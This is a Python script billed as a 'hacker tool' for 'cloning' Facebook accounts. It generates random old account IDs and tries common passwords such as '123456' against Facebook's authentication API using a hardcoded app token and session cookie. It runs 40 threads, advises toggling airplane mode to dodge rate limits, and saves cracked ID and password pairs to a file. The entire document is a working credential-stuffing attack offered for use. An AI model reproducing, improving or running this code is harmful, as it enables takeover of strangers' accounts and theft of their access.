#----------------------------[IMPORT/MODULE]-----------------------------------#
import requests,bs4,json,os,sys,uuid,random,datetime,time,re
import urllib3,rich,base64
os.system('xdg-open https://www.facebook.com/profile.php?id=61558895140975')
time.sleep(5)
print('\n \033[1;92m[✓]\r\r\033[1;92m WELCOME. TO ZaNiab HACKER TOOLZ....!')
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
import os,time,random,json,sys,datetime
try:
    import requests
except:
    os.system("pip3 install requests")
    import requests 
from concurrent.futures import ThreadPoolExecutor as ThreadPool
#-----------------------------[LINE]-----------------------------------#
def lin():
	print("\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;32m")

#----------------------------[COLOR/CODE]-----------------------------------#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;32m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
#----------------------------[USER/AGENT]-----------------------------------#
def windows():
    aV=str(random.choice(range(10,20)))
    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
    bV=str(random.choice(range(1,36)))
    bx=str(random.choice(range(34,38)))
    bz=f"5{bx}.{bV}"
    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
    cV=str(random.choice(range(1,36)))
    cx=str(random.choice(range(34,38)))
    cz=f"5{cx}.{cV}"
    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
    return random.choice([A,B,C,D])
#----------------------------[LOGO]-----------------------------------#
logo = (f"""            
 \033[1;36m ________   ______   ______  __    __   ______   _______        
|        \ /      \ |      \|  \  |  \ /      \ |       \       
 \$$$$$$$$|  $$$$$$\ \$$$$$$| $$\ | $$|  $$$$$$\| $$$$$$$\      
    /  $$ | $$__| $$  | $$  | $$$\| $$| $$__| $$| $$__/ $$      
   /  $$  | $$    $$  | $$  | $$$$\ $$| $$    $$| $$    $$      
  /  $$   | $$$$$$$$  | $$  | $$\$$ $$| $$$$$$$$| $$$$$$$\      
 /  $$___ | $$  | $$ _| $$_ | $$ \$$$$| $$  | $$| $$__/ $$      
|  $$    \| $$  | $$|   $$ \| $$  \$$$| $$  | $$| $$    $$      
 \$$$$$$$$ \$$   \$$ \$$$$$$ \$$   \$$ \$$   \$$ \$$$$$$$       
                                                                
\033[1;32m################################################
\033[1;32m[\033[1;32m≈\033[1;32m]\033[1;31m DEVELOPER   :  ZAINAB
\033[1;32m[\033[1;32m≈\033[1;32m]\033[1;32m FACEBOOK    :  CLONER
\033[1;32m[\033[1;32m≈\033[1;32m]\033[1;33m STATUS      :  FREE FOR ALL USER
\033[1;32m[\033[1;32m≈\033[1;32m]\033[1;34m GITHUB      :  ZAINAB X HAYA
\033[1;32m[\033[1;32m≈\033[1;32m]\033[1;35m VERSION     :  0.3
\033[1;32m[\033[1;32m≈\033[1;32m]\033[1;36m TOOL        :  \033[1;32mOLD CRACK\033[1;32m
\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;32m[\033[1;32m≈\033[1;32m]\033[1;32m FB GROUP    :  \033[1;91m\033[1;41m\033[1;32mTermux Free Command World 2024\033[;0m\033[1;91m\033[1;92m\033[38;5;46m
\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;32m""")
#----------------------------[MAIN/DEF]-----------------------------------#
def main():
    user=[]
    os.system("clear")
    print(logo)
    print(f'\033[1;34m[\033[1;34m=\033[1;34m] \033[1;34m MARI JAN EDR LIKH TUJY KTNI ID CLONE KRNI')
    print(f'\033[1;32m[\033[1;32m=\033[1;32m] \033[1;32mEXAMPLE    \033[1;31m : \033[1;31m5000/10000/99999')
    lin()
    limit=input(f"\033[1;32m[\033[1;32m?\033[1;32m]\033[1;32m INPUT \033[1;32m\033[1;32m: ")
    lin()
    os.system('clear')
    print(logo)
    print(f'\033[1;32m[\033[1;32m1\033[1;32m] \033[1;32m2006-2010-2014 ')
    print(f'\033[1;32m[\033[1;32m1\033[1;32m] \033[1;32mEDR SIRF 1 LIKH')
    lin()
    ask=input(f"\033[1;32m[\033[1;32m?\033[1;32m] INPUT \033[1;32m:\033[1;32m ")
    lin()
    if ask in["1"]:
        newrin="10000"
        for i in range(int(limit)):
            data=str(random.choice(range(1000000000,1999999999)))
            user.append(data)
    with ThreadPool(max_workers=40) as Tx:
        os.system('clear')
        print(logo)
        print(f'\x1b[38;5;196m[\x1b[38;5;46m=\x1b[38;5;196m]\x1b[38;5;46m TOTAL ID : {limit} \x1b[38;5;196m')
        print(f'\x1b[38;5;196m[\x1b[38;5;46m+\x1b[38;5;196m]\x1b[38;5;46m TURN \x1b[38;5;196m[\x1b[38;5;46mON\x1b[38;5;196m/\x1b[38;5;46mOFF\x1b[38;5;196m]\x1b[38;5;46m AIRPLANE MODE EVERY 5  MIN')
        lin()
        for chin in user:
            uid=newrin+chin
            Tx.submit(login,uid)    
loop=0
oks=[]
def login(uid):
    global oks,loop
    Session=requests.session()
    try:
        sys.stdout.write(f'\r\x1b[38;5;196m[\x1b[38;5;48mRUNNING\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\033[1;32m{loop}\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK•{len(oks)}\x1b[38;5;196m]')
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","123123","786786"]:
            headers = {
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
     'cookie': 'vpd=v1%3B676x360x2;datr=5uDeZu_QFW64wlmxBeoB8Jh5;sb=9ODeZnjbNAN92vquu3IgymyE;c_user=100089758920447;xs=27%3Aczfrmeu8z7EF5g%3A2%3A1725882695%3A-1%3A6137;locale=en_GB;fbl_st=101320847%3BT%3A28764711;wl_cbv=v2%3Bclient_version%3A2615%3Btimestamp%3A1725882699;oo=v1%7C3%3A1725883677;',
    'dpr': '2',
    'save-data': 'on',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"Infinix X682C"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"10.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
}
            rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
            if "session_key" in rp:
                print(f"\r\r\033[1;32m[\033[1;32mZAINAB-OK\033[1;32m]\033[1;32m {uid} {A}•{G} {pw}")
                open("/sdcard/ZAINAB-OK","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r\033[1;32m[\033[1;32mZAINAB-OK\033[1;32m]\033[1;32m {uid} {A}•{G} {pw}")
                open("/sdcard/ZAINAB-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except:pass
main()
#----------------------------[CODE/END]-----------------------------------#
